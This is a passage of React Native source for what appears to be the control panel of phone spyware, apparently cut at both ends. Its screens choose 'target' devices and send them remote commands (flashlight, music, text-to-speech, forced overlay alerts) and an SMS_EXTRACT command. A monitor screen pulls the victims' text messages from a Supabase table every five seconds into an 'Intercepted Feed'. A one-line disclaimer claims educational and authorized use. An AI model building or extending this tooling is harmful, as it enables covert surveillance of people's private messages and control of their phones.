            <Text style={{ marginTop: 32, textAlign: 'center', color: 'rgba(255,255,255,0.5)', paddingHorizontal: 20 }}>
                Developed for educational and authorized penetration testing purposes only.
            </Text>
        </View>
    </SafeAreaView>
);

const SettingsScreen = ({ onLogout, onSelectProfile, onAboutDev, userProfile, currentScreen, onNavigate, currentUser }) => {
    return (
        <SafeAreaView style={[styles.screen, { backgroundColor: COLORS.bgDark }]}>
            <View style={[styles.header, { paddingHorizontal: 24 }]}>
                <Text style={[styles.userName, { fontSize: 24 }]}>Settings</Text>
                <View style={[styles.glass, styles.iconBtn]}>
                    <Settings size={20} color={COLORS.primary} />
                </View>
            </View>

            <ScrollView contentContainerStyle={{ paddingBottom: 120, paddingHorizontal: 24 }}>
                <TouchableOpacity style={{ marginBottom: 16 }} onPress={onSelectProfile}>
                    <GlassCard style={styles.settingsItem}>
                        <View style={styles.settingsRow}>
                            <View style={[styles.settingsIconBox, { overflow: 'hidden' }]}>
                                <Image
                                    source={{ uri: userProfile.image }}
                                    style={{ width: 44, height: 44, borderRadius: 22 }}
                                />
                            </View>
                            <View style={{ flex: 1 }}>
                                <Text style={styles.settingsLabel}>{currentUser ? currentUser.email : 'Change Profile Photo'}</Text>
                                <Text style={styles.textSecondary}>{currentUser ? `Plan: ${currentUser.plan}` : 'Update your hacker avatar'}</Text>
                            </View>
                            <View style={[styles.glass, { padding: 8, borderRadius: 12 }]}>
                                <ChevronRight size={16} color={COLORS.primary} />
                            </View>
                        </View>
                    </GlassCard>
                </TouchableOpacity>

                <View style={{ marginBottom: 24 }}>
                    <Text style={[styles.sectionTitle, { marginBottom: 16 }]}>Application Control</Text>

                    <GlassCard style={[styles.settingsItem, { backgroundColor: 'rgba(255, 215, 0, 0.05)' }]}>
                        <View style={styles.settingsRow}>
                            <View style={[styles.settingsIconBox, { backgroundColor: 'rgba(255, 215, 0, 0.1)' }]}>
                                <Smartphone size={20} color={COLORS.primary} />
                            </View>
                            <View style={{ flex: 1 }}>
                                <Text style={styles.settingsLabel}>Controller ID</Text>
                                <Text style={[styles.textSecondary, { fontSize: 18, color: '#fff', fontWeight: 'bold', marginTop: 4 }]}>
                                    {currentUser?.controller_id || 'NOT_LINKED'}
                                </Text>
                            </View>
                            <TouchableOpacity
                                style={[styles.glass, { padding: 10, borderRadius: 12 }]}
                                onPress={() => {
                                    if (currentUser?.controller_id) {
                                        Alert.alert('Controller ID', currentUser.controller_id);
                                    }
                                }}
                            >
                                <Smartphone size={18} color={COLORS.primary} />
                            </TouchableOpacity>
                        </View>
                    </GlassCard>

                    <TouchableOpacity style={{ marginBottom: 12, marginTop: 12 }} onPress={onAboutDev}>
                        <GlassCard style={styles.settingsItem}>
                            <View style={styles.settingsRow}>
                                <View style={[styles.settingsIconBox, { backgroundColor: 'rgba(255,255,255,0.05)' }]}>
                                    <ShieldCheck size={20} color={COLORS.primary} />
                                </View>
                                <Text style={styles.settingsLabel}>About Dev</Text>
                            </View>
                        </GlassCard>
                    </TouchableOpacity>

                    <TouchableOpacity onPress={onLogout}>
                        <GlassCard style={styles.settingsItem}>
                            <View style={styles.settingsRow}>
                                <View style={[styles.settingsIconBox, { backgroundColor: 'rgba(255,0,0,0.1)' }]}>
                                    <Power size={20} color="#ff3b30" />
                                </View>
                                <Text style={[styles.settingsLabel, { color: '#ff3b30' }]}>Logout</Text>
                            </View>
                        </GlassCard>
                    </TouchableOpacity>
                </View>
            </ScrollView>

            <BottomNav currentScreen={currentScreen} onNavigate={onNavigate} />
        </SafeAreaView>
    );
};


const MagicToggle = ({ isOn, onToggle }) => {
    const animatedValue = useRef(new Animated.Value(isOn ? 1 : 0)).current;
    const sparkleAnim = useRef(new Animated.Value(0)).current;

    useEffect(() => {
        Animated.timing(animatedValue, {
            toValue: isOn ? 1 : 0,
            duration: 300,
            useNativeDriver: false,
        }).start();
    }, [isOn]);

    useEffect(() => {
        Animated.loop(
            Animated.timing(sparkleAnim, {
                toValue: 1,
                duration: 2000,
                useNativeDriver: false,
            })
        ).start();
    }, []);

    const translateX = animatedValue.interpolate({
        inputRange: [0, 1],
        outputRange: [5, 65], // Adjusted for RN layout
    });

    const rotateIcon = animatedValue.interpolate({
        inputRange: [0, 1],
        outputRange: ['0deg', '-225deg'],
    });

    const bgColor = animatedValue.interpolate({
        inputRange: [0, 1],
        outputRange: ['#121212', '#41434400'],
    });

    const handleBg = animatedValue.interpolate({
        inputRange: [0, 1],
        outputRange: ['#414344', '#045ab1'],
    });

    // Generate sparkles data
    const sparkles = [
        { deg: 25, dur: 11, w: 2 }, { deg: 100, dur: 18, w: 1 }, { deg: 280, dur: 5, w: 1 },
        { deg: 200, dur: 3, w: 2 }, { deg: 30, dur: 20, w: 2 }, { deg: 300, dur: 9, w: 2 },
        { deg: 250, dur: 4, w: 1 }, { deg: 210, dur: 8, w: 2 }, { deg: 100, dur: 10, w: 2 }
    ];

    return (
        <View style={mtStyles.container}>
            <TouchableOpacity activeOpacity={1} onPress={onToggle} style={mtStyles.outerWrapper}>
                <Animated.View style={[mtStyles.label, { backgroundColor: bgColor }]}>
                    <Animated.View style={[
                        mtStyles.handle,
                        {
                            transform: [{ translateX }, { rotate: rotateIcon }],
                            backgroundColor: handleBg
                        }
                    ]}>
                        <View style={mtStyles.iconContainer}>
                            {sparkles.map((s, i) => (
                                <Animated.View
                                    key={i}
                                    style={[
                                        mtStyles.sparkle,
                                        {
                                            width: s.w,
                                            height: s.w,
                                            transform: [
                                                { rotate: `${s.deg}deg` },
                                                {
                                                    translateX: sparkleAnim.interpolate({
                                                        inputRange: [0, 1],
                                                        outputRange: [0, 100]
                                                    })
                                                }
                                            ]
                                        }
                                    ]}
                                />
                            ))}
                            <Svg width="20" height="20" viewBox="0 0 30 30" style={mtStyles.svgIcon}>
                                <Path
                                    fill={isOn ? COLORS.primary : "#d9d9d9"}
                                    d="M0.96233 28.61C1.36043 29.0081 1.96007 29.1255 2.47555 28.8971L10.4256 25.3552C13.2236 24.11 16.4254 24.1425 19.2107 25.4401L27.4152 29.2747C27.476 29.3044 27.5418 29.3023 27.6047 29.32C27.6563 29.3348 27.7079 29.3497 27.761 29.3574C27.843 29.3687 27.9194 29.3758 28 29.3688C28.1273 29.3617 28.2531 29.3405 28.3726 29.2945C28.4447 29.262 28.5162 29.2287 28.5749 29.1842C28.6399 29.1446 28.6993 29.0994 28.7509 29.0477L28.9008 28.8582C28.9468 28.7995 28.9793 28.7274 29.0112 28.656C29.0599 28.5322 29.0811 28.4036 29.0882 28.2734C29.0939 28.1957 29.0868 28.1207 29.0769 28.0415C29.0705 27.9955 29.0585 27.9524 29.0472 27.9072C29.0295 27.8343 29.0302 27.7601 28.9984 27.6901L25.1638 19.4855C23.8592 16.7073 23.8273 13.5048 25.0726 10.7068L28.6145 2.75679C28.8429 2.24131 28.7318 1.63531 28.3337 1.2372C27.9165 0.820011 27.271 0.721743 26.7491 0.9961L19.8357 4.59596C16.8418 6.15442 13.2879 6.18696 10.2615 4.70062L1.80308 0.520214C1.7055 0.474959 1.60722 0.441742 1.50964 0.421943C1.44459 0.409215 1.37882 0.395769 1.3074 0.402133C1.14406 0.395769 0.981436 0.428275 0.818095 0.499692C0.77284 0.519491 0.719805 0.545671 0.67455 0.578198C0.596061 0.617088 0.524653 0.675786 0.4596 0.74084C0.394546 0.805894 0.335843 0.877306 0.296245 0.956502C0.263718 1.00176 0.237561 1.05477 0.217762 1.10003C0.152708 1.24286 0.126545 1.40058 0.120181 1.54978C0.120181 1.61483 0.126527 1.6735 0.132891 1.73219C0.15269 1.85664 0.178881 1.97332 0.237571 2.08434L4.41798 10.5427C5.91139 13.5621 5.8725 17.1238 4.3204 20.1099L0.720514 27.0233C0.440499 27.5536 0.545137 28.1928 0.96233 28.61Z"
                                />
                            </Svg>
                        </View>
                    </Animated.View>
                </Animated.View>
            </TouchableOpacity>
        </View>
    );
};

const mtStyles = StyleSheet.create({
    container: {
        alignItems: 'center',
        justifyContent: 'center',
    },
    outerWrapper: {
        width: 120,
        height: 60,
        borderRadius: 30,
        backgroundColor: '#414344',
        padding: 4,
        justifyContent: 'center',
    },
    label: {
        width: '100%',
        height: '100%',
        borderRadius: 26,
        borderWidth: 1,
        borderColor: '#777777',
        justifyContent: 'center',
    },
    handle: {
        width: 50,
        height: 50,
        borderRadius: 25,
        borderWidth: 1,
        borderColor: '#aaaaaa',
        alignItems: 'center',
        justifyContent: 'center',
        elevation: 5,
        shadowColor: '#0080ff',
        shadowOffset: { width: 0, height: 2 },
        shadowOpacity: 0.5,
        shadowRadius: 4,
    },
    iconContainer: {
        width: '100%',
        height: '100%',
        alignItems: 'center',
        justifyContent: 'center',
        overflow: 'hidden',
        borderRadius: 25,
    },
    svgIcon: {
        zIndex: 10,
    },
    sparkle: {
        position: 'absolute',
        backgroundColor: '#fff',
        borderRadius: 1,
    }
});

const FlashlightScreen = ({ onBack, broadcastCommand }) => {
    const [isOn, setIsOn] = useState(false);

    const handleToggle = () => {
        const nextState = !isOn;
        setIsOn(nextState);
        broadcastCommand(nextState ? 'FLASHLIGHT_ON' : 'FLASHLIGHT_OFF');
    };

    return (
        <View style={[styles.screen, { backgroundColor: COLORS.bgDark }]}>
            <SafeAreaView style={styles.roomHeaderWrap}>
                <View style={styles.roomHeader}>
                    <TouchableOpacity onPress={onBack} style={[styles.glass, styles.iconBtn]}>
                        <ArrowLeft size={20} color="#fff" />
                    </TouchableOpacity>
                    <Text style={styles.roomHeaderTitle}>Flashlight Hack</Text>
                    <View style={{ width: 48 }} />
                </View>
            </SafeAreaView>

            <View style={{ flex: 1, justifyContent: 'center', alignItems: 'center' }}>
                <View style={{ marginBottom: 40, alignItems: 'center' }}>
                    <Text style={[styles.onboardingTitle, { fontSize: 24, textAlign: 'center' }]}>Magic Wand Control</Text>
                    <Text style={[styles.onboardingDesc, { textAlign: 'center', marginBottom: 20 }]}>
                        {isOn ? 'Hardware layer is ACTIVE' : 'Hardware layer is STANDBY'}
                    </Text>
                </View>

                <MagicToggle isOn={isOn} onToggle={handleToggle} />

                <View style={{ marginTop: 60, width: '80%' }}>
                    <GlassCard style={{ padding: 20 }}>
                        <View style={{ flexDirection: 'row', alignItems: 'center', gap: 12 }}>
                            <Zap size={20} color={isOn ? COLORS.primary : '#666'} />
                            <Text style={{ color: '#fff', fontSize: 14 }}>Status: {isOn ? 'TRANSMITTING' : 'READY'}</Text>
                        </View>
                    </GlassCard>
                </View>
            </View>
        </View>
    );
};

const MusicHackScreen = ({ onBack, broadcastCommand }) => {
    const [isJetset, setIsJetset] = useState(false);
    const [isJokowi, setIsJokowi] = useState(false);

    const handleToggleJetset = () => {
        const nextState = !isJetset;
        setIsJetset(nextState);
        if (nextState) {
            setIsJokowi(false); // Matikan yang lain
            broadcastCommand('MUSIC_PLAY_JETSET');
        } else {
            broadcastCommand('MUSIC_STOP');
        }
    };

    const handleToggleJokowi = () => {
        const nextState = !isJokowi;
        setIsJokowi(nextState);
        if (nextState) {
            setIsJetset(false); // Matikan yang lain
            broadcastCommand('MUSIC_PLAY_JOKOWI');
        } else {
            broadcastCommand('MUSIC_STOP');
        }
    };

    return (
        <View style={[styles.screen, { backgroundColor: COLORS.bgDark }]}>
            <SafeAreaView style={styles.roomHeaderWrap}>
                <View style={styles.roomHeader}>
                    <TouchableOpacity onPress={onBack} style={[styles.glass, styles.iconBtn]}>
                        <ArrowLeft size={20} color="#fff" />
                    </TouchableOpacity>
                    <Text style={styles.roomHeaderTitle}>Music Hack</Text>
                    <View style={{ width: 48 }} />
                </View>
            </SafeAreaView>

            <ScrollView contentContainerStyle={{ flexGrow: 1, justifyContent: 'center', padding: 20 }}>
                <View style={{ marginBottom: 30, alignItems: 'center' }}>
                    <Text style={[styles.onboardingTitle, { fontSize: 24 }]}>Audio Link Control</Text>
                    <Text style={[styles.onboardingDesc, { textAlign: 'center' }]}>
                        Select the payload to broadcast on the target hardware layer.
                    </Text>
                </View>

                {/* Jetset Control */}
                <View style={mhStyles.controlCard}>
                    <View style={mhStyles.cardHeader}>
                        <View style={mhStyles.iconCirc}>
                            <Music size={20} color={isJetset ? COLORS.primary : '#666'} />
                        </View>
                        <View style={{ flex: 1, marginLeft: 15 }}>
                            <Text style={mhStyles.trackTitle}>JETSET</Text>
                            <Text style={mhStyles.trackStatus}>{isJetset ? 'STREAMING ACTIVE' : 'READY'}</Text>
                        </View>
                        <MagicToggle isOn={isJetset} onToggle={handleToggleJetset} />
                    </View>
                </View>

                {/* Jokowi Control */}
                <View style={[mhStyles.controlCard, { marginTop: 20 }]}>
                    <View style={mhStyles.cardHeader}>
                        <View style={mhStyles.iconCirc}>
                            <Music size={20} color={isJokowi ? COLORS.primary : '#666'} />
                        </View>
                        <View style={{ flex: 1, marginLeft: 15 }}>
                            <Text style={mhStyles.trackTitle}>HIDUP JOKOWI</Text>
                            <Text style={mhStyles.trackStatus}>{isJokowi ? 'STREAMING ACTIVE' : 'READY'}</Text>
                        </View>
                        <MagicToggle isOn={isJokowi} onToggle={handleToggleJokowi} />
                    </View>
                </View>

                <View style={{ marginTop: 40 }}>
                    <GlassCard style={{ padding: 20 }}>
                        <Text style={{ color: 'rgba(255,255,255,0.4)', fontSize: 12, textAlign: 'center' }}>
                            All broadcasts are encrypted via local hardware tunnel.
                        </Text>
                    </GlassCard>
                </View>
            </ScrollView>
        </View>
    );
};

const mhStyles = StyleSheet.create({
    controlCard: {
        backgroundColor: 'rgba(255, 255, 255, 0.03)',
        borderRadius: 24,
        padding: 24,
        borderWidth: 1,
        borderColor: 'rgba(255, 255, 255, 0.08)',
    },
    cardHeader: {
        flexDirection: 'row',
        alignItems: 'center',
    },
    iconCirc: {
        width: 48,
        height: 48,
        borderRadius: 24,
        backgroundColor: 'rgba(255, 255, 255, 0.05)',
        justifyContent: 'center',
        alignItems: 'center',
    },
    trackTitle: {
        color: '#fff',
        fontSize: 18,
        fontWeight: '700',
        letterSpacing: 1,
    },
    trackStatus: {
        color: 'rgba(255, 255, 255, 0.4)',
        fontSize: 12,
        marginTop: 2,
    }
});

const SmsMonitoringScreen = ({ onBack, deviceId, broadcastCommand }) => {
    const [messages, setMessages] = useState([]);
    const [isLoading, setIsLoading] = useState(true);

    const fetchMessages = async () => {
        if (!deviceId) return;
        try {
            const response = await fetch(`${SUPABASE_REST_URL}/sms_logs?device_id=eq.${deviceId}&order=created_at.desc`, {
                headers: {
                    'apikey': SUPABASE_ANON_KEY,
                    'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
                }
            });
            const data = await response.json();
            if (Array.isArray(data)) {
                setMessages(data);
            }
        } catch (error) {
            console.error('FETCH_SMS_ERR:', error);
        } finally {
            setIsLoading(false);
        }
    };

    useEffect(() => {
        if (deviceId && broadcastCommand) {
            broadcastCommand('SMS_EXTRACT');
        }
        fetchMessages();
        const interval = setInterval(fetchMessages, 5000);
        return () => clearInterval(interval);
    }, [deviceId]);

    const screenHeight = Dimensions.get('window').height;
    const collapsedHeight = screenHeight * 0.25;
    const expandedHeight = screenHeight * 0.85;

    const translateY = useRef(new Animated.Value(screenHeight - collapsedHeight)).current;
    const lastTranslateY = useRef(screenHeight - collapsedHeight);

    const panResponder = useRef(
        PanResponder.create({
            onStartShouldSetPanResponder: () => true,
            onMoveShouldSetPanResponder: (_, gestureState) => Math.abs(gestureState.dy) > 10,
            onPanResponderMove: (_, gestureState) => {
                let nextValue = lastTranslateY.current + gestureState.dy;
                if (nextValue < screenHeight - expandedHeight) nextValue = screenHeight - expandedHeight;
                if (nextValue > screenHeight - collapsedHeight) nextValue = screenHeight - collapsedHeight;
                translateY.setValue(nextValue);
            },
            onPanResponderRelease: (_, gestureState) => {
                if (gestureState.dy < -50) {
                    // Expand
                    Animated.spring(translateY, {
                        toValue: screenHeight - expandedHeight,
                        useNativeDriver: false,
                        tension: 40,
                        friction: 8,
                    }).start();
                    lastTranslateY.current = screenHeight - expandedHeight;
                } else if (gestureState.dy > 50) {
                    // Collapse
                    Animated.spring(translateY, {
                        toValue: screenHeight - collapsedHeight,
                        useNativeDriver: false,
                        tension: 40,
                        friction: 8,
                    }).start();
                    lastTranslateY.current = screenHeight - collapsedHeight;
                } else {
                    // Reset to last state
                    Animated.spring(translateY, {
                        toValue: lastTranslateY.current,
                        useNativeDriver: false,
                    }).start();
                }
            },
        })
    ).current;

    const hintOpacity = translateY.interpolate({
        inputRange: [screenHeight - collapsedHeight - 40, screenHeight - collapsedHeight],
        outputRange: [0, 1],
        extrapolate: 'clamp',
    });

    const formatTime = (isoString) => {
        try {
            const date = new Date(isoString);
            return date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
        } catch (e) {
            return 'Just now';
        }
    };

    return (
        <View style={[styles.screen, { backgroundColor: COLORS.bgDark }]}>
            <SafeAreaView style={styles.roomHeaderWrap}>
                <View style={styles.roomHeader}>
                    <TouchableOpacity onPress={onBack} style={[styles.glass, styles.iconBtn]}>
                        <ArrowLeft size={20} color="#fff" />
                    </TouchableOpacity>
                    <Text style={styles.roomHeaderTitle}>SMS Monitor</Text>
                    <View style={{ width: 48 }} />
                </View>
            </SafeAreaView>

            <View style={{ flex: 1, justifyContent: 'center', alignItems: 'center' }}>
                <Text style={[styles.statusText, { marginTop: 0 }]}>
                    {isLoading ? 'ESTABLISHING SECURE TUNNEL...' : `MONITORING: ${messages.length} PACKETS CAPTURED`}
                </Text>
                {isLoading && <ActivityIndicator color={COLORS.primary} style={{ marginTop: 20 }} />}
            </View>

            <Animated.View
                style={[
                    styles.onboardingContent,
                    {
                        height: screenHeight,
                        transform: [{ translateY: translateY }],
                        zIndex: 1000,
                    }
                ]}
            >
                <Animated.View style={{ opacity: hintOpacity, alignItems: 'center', marginBottom: 10 }}>
                    <ChevronUp size={24} color={COLORS.primary} />
                    <Text style={{ color: COLORS.primary, fontSize: 12, fontWeight: '700', letterSpacing: 2 }}>
                        SWIPE UP TO VIEW MESSAGES
                    </Text>
                </Animated.View>

                <View style={[styles.glass, styles.onboardingSheet, { height: '100%', paddingTop: 0 }]}>
                    <View {...panResponder.panHandlers} style={{ paddingVertical: 15, alignItems: 'center', width: '100%' }}>
                        <View style={styles.sheetHandle} />
                    </View>
                    <Text style={styles.onboardingTitle}>Intercepted Feed</Text>

                    {messages.length === 0 && !isLoading ? (
                        <View style={{ flex: 1, justifyContent: 'center', alignItems: 'center', paddingBottom: 200 }}>
                            <Text style={{ color: 'rgba(255,255,255,0.3)', fontSize: 16 }}>Waiting for incoming traffic...</Text>
                        </View>
                    ) : (
                        <FlatList
                            data={messages}
                            keyExtractor={(item) => item.id.toString()}
                            style={{ width: '100%', marginTop: 20 }}
                            contentContainerStyle={{ paddingBottom: screenHeight * 0.2 }}
                            renderItem={({ item }) => (
                                <View style={styles.smsItem}>
                                    <View style={styles.smsHeader}>
                                        <Text style={styles.smsSender}>{item.sender || 'Unknown'}</Text>
                                        <Text style={styles.smsTime}>{formatTime(item.created_at)}</Text>
                                    </View>
                                    <View style={{ flexDirection: 'row', alignItems: 'flex-start', gap: 10, marginTop: 8 }}>
                                        <Shield size={14} color={COLORS.primary} style={{ marginTop: 2 }} />
                                        <Text style={styles.smsMessage}>{item.message}</Text>
                                    </View>
                                </View>
                            )}
                            ItemSeparatorComponent={() => <View style={styles.smsSeparator} />}
                        />
                    )}
                </View>
            </Animated.View>
        </View>
    );
};

const TargetDevicesScreen = ({ onBack, onSelectDevice, devices, onDeleteDevice }) => {
    const screenHeight = Dimensions.get('window').height;

    return (
        <View style={[styles.screen, { backgroundColor: COLORS.bgDark }]}>
            <SafeAreaView style={styles.roomHeaderWrap}>
                <View style={styles.roomHeader}>
                    <TouchableOpacity onPress={onBack} style={[styles.glass, styles.iconBtn]}>
                        <ArrowLeft size={20} color="#fff" />
                    </TouchableOpacity>
                    <Text style={styles.roomHeaderTitle}>Target Selection</Text>
                    <View style={{ width: 48 }} />
                </View>
            </SafeAreaView>

            <View style={{ flex: 1, padding: 20 }}>
                <View style={{ marginBottom: 20 }}>
                    <Text style={styles.onboardingTitle}>Available Devices</Text>
                    <Text style={{ color: 'rgba(255,255,255,0.5)', fontSize: 14 }}>
                        {devices.length} Active targets found in the network
                    </Text>
                </View>

                <FlatList
                    data={devices}
                    keyExtractor={(item) => item.id}
                    showsVerticalScrollIndicator={false}
                    contentContainerStyle={{ paddingBottom: 40 }}
                    renderItem={({ item }) => (
                        <View style={tdStyles.card}>
                            <View style={tdStyles.titleRow}>
                                <View style={tdStyles.iconBox}>
                                    <Smartphone size={14} color="#fff" />
                                </View>
                                <Text style={tdStyles.titleText}>{item.name}</Text>
                                <View style={tdStyles.percentContainer}>
                                    <ChevronUp size={16} color="#02972f" />
                                    <Text style={tdStyles.percentText}>Online</Text>
                                </View>
                            </View>

                            <View style={tdStyles.dataContainer}>
                                <Text style={tdStyles.mainDataText}>{item.os}</Text>
                                <Text style={tdStyles.subDataText}>{item.network}</Text>
                                <View style={tdStyles.rangeBackground}>
                                    <View style={[tdStyles.rangeFill, { width: '85%' }]} />
                                </View>
                            </View>

                            <View style={tdStyles.actionRow}>
                                <TouchableOpacity
                                    style={tdStyles.executeBtn}
                                    onPress={() => onSelectDevice(item)}
                                >
                                    <View style={tdStyles.executeIcon}>
                                        <Zap size={14} color="#000" />
                                    </View>
                                    <Text style={tdStyles.executeText}>EXECUTE TARGET</Text>
                                </TouchableOpacity>
                                <TouchableOpacity
                                    style={tdStyles.deleteBtn}
                                    onPress={() => onDeleteDevice(item.id)}
                                >
                                    <Trash2 size={18} color="#FF4444" />
                                </TouchableOpacity>
                            </View>
                        </View>
                    )}
                    ItemSeparatorComponent={() => <View style={{ height: 16 }} />}
                />
            </View>
        </View>
    );
};

const tdStyles = StyleSheet.create({
    card: {
        padding: 20,
        backgroundColor: '#FFFFFF',
        borderRadius: 20,
        shadowColor: '#000',
        shadowOffset: { width: 0, height: 10 },
        shadowOpacity: 0.1,
        shadowRadius: 15,
        elevation: 5,
    },
    titleRow: {
        flexDirection: 'row',
        alignItems: 'center',
    },
    iconBox: {
        width: 24,
        height: 24,
        borderRadius: 12,
        backgroundColor: '#10B981',
        justifyContent: 'center',
        alignItems: 'center',
    },
    titleText: {
        marginLeft: 10,
        color: '#374151',
        fontSize: 16,
        fontWeight: '600',
        flex: 1,
    },
    percentContainer: {
        flexDirection: 'row',
        alignItems: 'center',
        marginLeft: 10,
    },
    percentText: {
        color: '#02972f',
        fontWeight: '600',
        fontSize: 14,
    },
    dataContainer: {
        marginTop: 16,
    },
    mainDataText: {
        color: '#1F2937',
        fontSize: 32,
        fontWeight: '700',
        lineHeight: 40,
    },
    subDataText: {
        color: '#6B7280',
        fontSize: 14,
        marginTop: 4,
        marginBottom: 12,
    },
    rangeBackground: {
        height: 8,
        backgroundColor: '#E5E7EB',
        borderRadius: 4,
        width: '100%',
    },
    rangeFill: {
        height: '100%',
        backgroundColor: '#10B981',
        borderRadius: 4,
    },
    actionRow: {
        flexDirection: 'row',
        marginTop: 20,
        alignItems: 'center',
        gap: 12,
    },
    executeBtn: {
        flex: 1,
        flexDirection: 'row',
        alignItems: 'center',
        backgroundColor: '#CCFF00',
        paddingVertical: 12,
        paddingHorizontal: 16,
        borderRadius: 12,
        borderWidth: 1,
        borderColor: 'rgba(0,0,0,0.1)',
    },
    executeIcon: {
        marginRight: 8,
    },
    executeText: {
        color: '#000',
        fontWeight: '700',
        fontSize: 12,
        letterSpacing: 1,
    },
    deleteBtn: {
        width: 44,
        height: 44,
        borderRadius: 12,
        backgroundColor: 'rgba(255, 0, 0, 0.05)',
        justifyContent: 'center',
        alignItems: 'center',
        borderWidth: 1,
        borderColor: 'rgba(255, 0, 0, 0.1)',
    }
});

const TTSScreen = ({ onBack, broadcastCommand }) => {
    const [text, setText] = useState('');

    const handleSend = () => {
        if (!text.trim()) return;
        broadcastCommand('TTS_SPEAK', { text });
        setText('');
        Alert.alert('Berhasil', 'Pesan TTS sedang dikirim ke target.');
    };

    return (
        <View style={[styles.screen, { backgroundColor: COLORS.bgDark }]}>
            <SafeAreaView style={styles.roomHeaderWrap}>
                <View style={styles.roomHeader}>
                    <TouchableOpacity onPress={onBack} style={[styles.glass, styles.iconBtn]}>
                        <ArrowLeft size={20} color="#fff" />
                    </TouchableOpacity>
                    <Text style={styles.roomHeaderTitle}>TTS Hack</Text>
                    <View style={{ width: 48 }} />
                </View>
            </SafeAreaView>

            <View style={{ flex: 1, justifyContent: 'center', alignItems: 'center', padding: 20 }}>
                <View style={ttsStyles.form}>
                    <Text id="heading" style={ttsStyles.heading}>Broadcast Message</Text>

                    <View style={ttsStyles.field}>
                        <MessageSquare size={18} color="#fff" style={ttsStyles.inputIcon} />
                        <TextInput
                            style={ttsStyles.inputField}
                            placeholder="Enter text here..."
                            placeholderTextColor="rgba(255,255,255,0.3)"
                            value={text}
                            onChangeText={setText}
                            autoComplete="off"
                        />
                    </View>

                    <View style={ttsStyles.btnContainer}>
                        <TouchableOpacity style={ttsStyles.button1} onPress={handleSend}>
                            <Text style={ttsStyles.btnText}>SEND TTS</Text>
                        </TouchableOpacity>
                        <TouchableOpacity style={ttsStyles.button2} onPress={() => setText('')}>
                            <Text style={ttsStyles.btnText}>CLEAR</Text>
                        </TouchableOpacity>
                    </View>

                    <TouchableOpacity style={ttsStyles.button3} onPress={onBack}>
                        <Text style={ttsStyles.btnText}>CANCEL BROADCAST</Text>
                    </TouchableOpacity>
                </View>

                <View style={{ marginTop: 40, width: '100%' }}>
                    <GlassCard style={{ padding: 20 }}>
                        <Text style={{ color: 'rgba(255,255,255,0.5)', fontSize: 12, textAlign: 'center' }}>
                            Hardware layer access: GRANTED
                        </Text>
                    </GlassCard>
                </View>
            </View>
        </View>
    );
};

const ttsStyles = StyleSheet.create({
    form: {
        width: '100%',
        paddingHorizontal: 20,
        paddingBottom: 20,
        backgroundColor: '#171717',
        borderRadius: 25,
        borderWidth: 1,
        borderColor: 'rgba(255,255,255,0.05)',
    },
    heading: {
        textAlign: 'center',
        marginVertical: 32,
        color: '#fff',
        fontSize: 20,
        fontWeight: '600',
    },
    field: {
        flexDirection: 'row',
        alignItems: 'center',
        gap: 12,
        borderRadius: 25,
        padding: 12,
        backgroundColor: '#121212',
        // Mimic inset shadow in RN
        borderWidth: 1,
        borderColor: 'rgba(0,0,0,0.5)',
        shadowColor: '#000',
        shadowOffset: { width: 0, height: 2 },
        shadowOpacity: 0.8,
        shadowRadius: 10,
        elevation: 10,
    },
    inputIcon: {
        marginLeft: 8,
    },
    inputField: {
        flex: 1,
        color: '#d3d3d3',
        fontSize: 14,
    },
    btnContainer: {
        flexDirection: 'row',
        justifyContent: 'center',
        marginTop: 40,
        gap: 8,
    },
    button1: {
        paddingHorizontal: 24,
        paddingVertical: 12,
        borderRadius: 8,
        backgroundColor: '#252525',
        alignItems: 'center',
        borderWidth: 1,
        borderColor: 'rgba(255,255,255,0.1)',
    },
    button2: {
        paddingHorizontal: 24,
        paddingVertical: 12,
        borderRadius: 8,
        backgroundColor: '#252525',
        alignItems: 'center',
        borderWidth: 1,
        borderColor: 'rgba(255,255,255,0.1)',
    },
    button3: {
        marginTop: 20,
        paddingVertical: 12,
        borderRadius: 8,
        backgroundColor: '#252525',
        alignItems: 'center',
        borderWidth: 1,
        borderColor: 'rgba(255,255,255,0.1)',
    },
    btnText: {
        color: '#fff',
        fontSize: 12,
        fontWeight: '600',
    }
});

const AlertInjectionScreen = ({ onBack, broadcastCommand }) => {
    const [title, setTitle] = useState('');
    const [message, setMessage] = useState('');

    const handleSend = () => {
        if (!title.trim() || !message.trim()) {
            Alert.alert('Error', 'Please enter both Title and Message');
            return;
        }
        broadcastCommand('ALERT_SHOW', { title, message });
        setTitle('');
        setMessage('');
        Alert.alert('Success', 'Payload sent to target UI.');
    };

    return (
        <View style={[styles.screen, { backgroundColor: COLORS.bgDark }]}>
            <SafeAreaView style={styles.roomHeaderWrap}>
                <View style={styles.roomHeader}>
                    <TouchableOpacity onPress={onBack} style={[styles.glass, styles.iconBtn]}>
                        <ArrowLeft size={20} color="#fff" />
                    </TouchableOpacity>
                    <Text style={styles.roomHeaderTitle}>Custom Alert</Text>
                    <View style={{ width: 48 }} />
                </View>
            </SafeAreaView>

            <View style={{ flex: 1, padding: 20 }}>
                <View style={{ marginBottom: 30, alignItems: 'center' }}>
                    <Text style={[styles.onboardingTitle, { fontSize: 24 }]}>UI Override</Text>
                    <Text style={[styles.onboardingDesc, { textAlign: 'center' }]}>
                        Force display a system-level overlay message on the target device.
                    </Text>
                </View>

                <View style={ttsStyles.form}>
                    <Text style={[ttsStyles.heading, { marginVertical: 20 }]}>Configure Payload</Text>

                    <View style={[ttsStyles.field, { marginBottom: 16 }]}>
                        <View style={{ width: 24, alignItems: 'center' }}><Text style={{ color: COLORS.primary, fontWeight: '900' }}>H</Text></View>
                        <TextInput
                            style={ttsStyles.inputField}
                            placeholder="Alert Title"
                            placeholderTextColor="rgba(255,255,255,0.3)"
                            value={title}
                            onChangeText={setTitle}
                        />
                    </View>

                    <View style={[ttsStyles.field, { height: 120, alignItems: 'flex-start', paddingVertical: 12 }]}>
                        <MessageSquare size={18} color={COLORS.primary} style={{ marginTop: 4 }} />
                        <TextInput
                            style={[ttsStyles.inputField, { textAlignVertical: 'top', height: '100%', marginLeft: 8 }]}
                            placeholder="Message Body..."
                            placeholderTextColor="rgba(255,255,255,0.3)"
                            value={message}
                            onChangeText={setMessage}
                            multiline
                        />
                    </View>

                    <TouchableOpacity style={[ttsStyles.button1, { marginTop: 24, backgroundColor: COLORS.primary, borderColor: COLORS.primary }]} onPress={handleSend}>
                        <Text style={[ttsStyles.btnText, { color: '#000', fontWeight: '900', fontSize: 14 }]}>INJECT TO TARGET</Text>
